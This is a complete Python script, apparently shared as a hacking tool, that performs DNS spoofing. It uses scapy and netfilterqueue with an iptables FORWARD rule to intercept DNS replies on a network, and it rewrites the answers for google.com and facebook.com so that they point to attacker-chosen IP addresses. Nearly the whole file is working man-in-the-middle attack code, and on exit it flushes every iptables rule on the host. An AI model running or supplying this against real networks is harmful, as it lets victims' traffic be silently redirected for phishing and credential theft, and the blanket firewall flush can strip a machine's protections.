#!/usr/bin/env python3
# Coded by CyberCommands
import os
from scapy.all import *
from netfilterqueue import NetfilterQueue

# DNS mapping records, feel free to add/modify this dictionary
# For example, google.com will be redirected to 192.168.1.100
dns_hosts = {
    b"www.google.com.": "192.168.1.100",
    b"google.com.": "192.168.1.100",
    b"facebook.com.": "172.217.19.142"
}


def process_packet(packet):
    # Whenever a new packet is redirected to the netfilter queue, this callback is called.
    # Convert netfilter queue packet to scapy packet.
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        # If the packet is a DNS Resource Record (DNS reply).
        # Modify the packet.
        print("[Before]:", scapy_packet.summary())
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            # Not UDP packet, this can be IPerror/UDPerror packets.
            pass
        print("[After ]:", scapy_packet.summary())
        # Set back as netfilter queue packet
        packet.set_payload(bytes(scapy_packet))
    packet.accept()


def modify_packet(packet):
    # Modifies the DNS Resource Record `packet` ( the answer part) to map our globally defined `dns_hosts` dictionary.
    # For instance, whenver we see a google.com answer, this function replaces.
    # The real IP address (172.217.19.142) with fake IP address (192.168.1.100)

    # Get the DNS question name, the domain name
    qname = packet[DNSQR].qname
    if qname not in dns_hosts:
        # If the website isn't in our record
        # Don't wanna modify that
        print("no modification:", qname)
        return packet
    # Craft new answer, overriding the original.
    # Fetting the rdata for the IP we want to redirect (spoofed).
    # For instance, google.com will be mapped to "192.168.1.100"
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    packet[DNS].ancount = 1
    # Delete checksums and length of packet, because we have modified the packet.
    # New calculations are required (scapy will do automatically).
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum

    return packet


if __name__ == "__main__":
    QUEUE_NUM = 0
    # Insert the iptables FORWARD rule
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
    # Instantiate the netfilter queue.
    queue = NetfilterQueue()
    try:
        queue.bind(QUEUE_NUM, process_packet)
        queue.run()
    except KeyboardInterrupt:
        os.system("iptables --flush")